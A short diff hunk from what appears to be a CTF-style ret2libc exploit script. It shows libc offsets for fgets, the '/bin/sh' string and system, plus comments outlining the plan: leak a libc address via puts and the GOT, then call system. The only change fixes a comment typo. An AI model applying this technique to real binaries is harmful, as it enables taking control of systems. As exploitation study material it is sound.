@@ -134,7 +134,7 @@ fgets_libc_addr = 0x0005e150 # 0x00065c50 locally
 bin_sh_libc_addr = 0x0015ba0b # 0x0017882a locally
 system_libc_addr = 0x0003ada0 # 0x0003c7d0 locally
 
-# Goal : Leak puts addr and cal system
+# Goal : Leak puts addr and call system
 # step 1 : Leak fgets
 # - Build a false stack frame
 # - Call puts with delta GOT offset as argument
